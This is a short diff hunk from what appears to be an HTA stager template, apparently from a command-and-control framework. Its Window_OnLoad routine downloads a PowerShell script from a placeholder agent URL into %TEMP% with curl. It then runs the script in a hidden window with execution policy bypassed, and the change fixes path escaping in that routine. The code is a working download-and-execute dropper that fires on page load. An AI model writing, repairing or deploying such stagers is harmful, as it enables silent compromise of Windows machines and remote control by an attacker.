@@ -56,7 +56,7 @@ Sub Window_OnLoad
     Set sh = CreateObject("WScript.Shell")
     Randomize
     n = CStr(Int(Rnd * 89999) + 10000)
-    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\svc" & n & ".ps1"
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\svc" & n & ".ps1"
     sh.Run "cmd /c curl.exe -s -o " & Chr(34) & tmp & Chr(34) & " {AGENT_URL}", 0, True
     sh.Run "powershell.exe -w h -nop -ep bypass -f " & Chr(34) & tmp & Chr(34), 0, False
     Self.Close
